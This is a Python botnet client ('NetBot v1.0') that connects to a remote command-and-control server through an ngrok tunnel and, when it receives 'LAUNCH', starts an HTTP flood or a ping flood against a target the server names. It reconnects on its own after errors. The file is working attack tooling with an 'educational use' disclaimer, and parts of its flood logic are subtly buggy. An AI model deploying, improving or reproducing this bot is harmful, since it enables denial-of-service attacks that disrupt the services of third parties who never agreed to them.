#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran
# Tool 		 : NetBot v1.0
# 
# Description	 : This is a command & control center client-server code.
#              		Should be used only for educational, research purposes and internal use only.
#

import socket
import time
import threading
import time
import os
import urllib.request
import subprocess
import signal



class lauchLoad:
      
	def __init__(self):
		self._running = True
      
	def terminate(self):
		self._running = False
      
	def run(self, n):
		global statusSet
		try:
			if n[3] == "HTTPFLOOD":
				receiving_url = 'http://' + n[0] + ':' + n[1] + '/'
				
				while self._running and statusSet:
					try:
						urllib.request.urlopen(receiving_url, timeout=10).read()
					except urllib.error.URLError as e:
						print(f"❌ Error en request: {e}")
						time.sleep(2)  # Breve pausa antes de reintentar
						continue  # ← CONTINUAR, no return
					except Exception as e:
						print(f"❌ Error inesperado: {e}")
						time.sleep(2)
						continue  # ← CONTINUAR, no return
		finally:
			print("🛑 Thread de ataque terminado")
			statusSet = 0  # ← RESETEAR al terminar

		if n[3]=="PINGFLOOD":
			while self._running:
				if statusSet:
					if run == 0:
						receiving_url = 'ping '+n[0]+' -i 0.0000001 -s 65000 > /dev/null 2>&1'
						pro = subprocess.Popen(receiving_url, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
						run = 1
				else:
					if run == 1:
						os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
						run = 0
						break

def connect_with_retry(host, port):
    max_retries = 5
    retry_delay = 15
    
    for attempt in range(max_retries):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.settimeout(30)  # Timeout de 30 segundos
            s.connect((host, port))
            print(f"✅ Conectado en intento {attempt + 1}")
            return s
        except Exception as e:
            print(f"❌ Intento {attempt + 1} falló: {e}")
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
    
    print("No se pudo conectar después de múltiples intentos")
    return None
				


def Main():
    # Flags
    global statusSet
    statusSet = 0
    global updated
    updated = 0
    global terminate
    terminate = 0
    
    t = None  # ← Definir fuera del if

    host = '0.tcp.sa.ngrok.io'
    port = 15170 

    s = connect_with_retry(host, port)

    if s is None:
        print("❌ No se pudo establecer conexión. Reintentando...")
        time.sleep(15)
        Main()
        return
    
    message = "HEARTBEAT"

    try:
        while True:
            try:
                s.send(message.encode())	
                time.sleep(5)
            except Exception as e:
                print(f"❌ Error enviando mensaje: {e}")
                break
        
            data = s.recv(1024)
            print('Response:', str(data.decode()))

            data = str(data.decode())
            data = data.split('_')
            
            if len(data) > 1:
                runStatus = data[2]
            else:
                runStatus = "OFFLINE"
            
            print('Response:', runStatus)
        
            if runStatus == "LAUNCH":
                # ✅ Verificar si necesitamos crear/recrear thread
                if t is None or not t.is_alive():
                    if t is not None:
                        print('⚠️  Thread anterior murió, reiniciando...')
                    
                    statusSet = 1
                    c = lauchLoad()
                    t = threading.Thread(target=c.run, args=(data,))
                    t.daemon = True  # ← Importante
                    t.start()
                    print("✅ Thread de ataque iniciado")
                else:
                    print('Connecting...')  # ← Ahora SÍ aparecerá
                
            elif runStatus == "HALT":
                if statusSet == 1:
                    print("🛑 Deteniendo ataque...")
                    statusSet = 0
                    if t and t.is_alive():
                        t.join(timeout=2)  # Esperar a que termine
                
            elif runStatus == "HOLD":
                statusSet = 0
                print('Waiting for Instructions from server.')
                
            else:
                statusSet = 0
                print('Server Offline.')
                
    finally:
        if t and t.is_alive():
            statusSet = 0
            print("Esperando a que termine el thread...")
            t.join(timeout=5)
        
        s.close()
        print("🔌 Conexión cerrada. Reconectando...")
        time.sleep(5)
        Main()
	

if __name__ == '__main__':
	Main()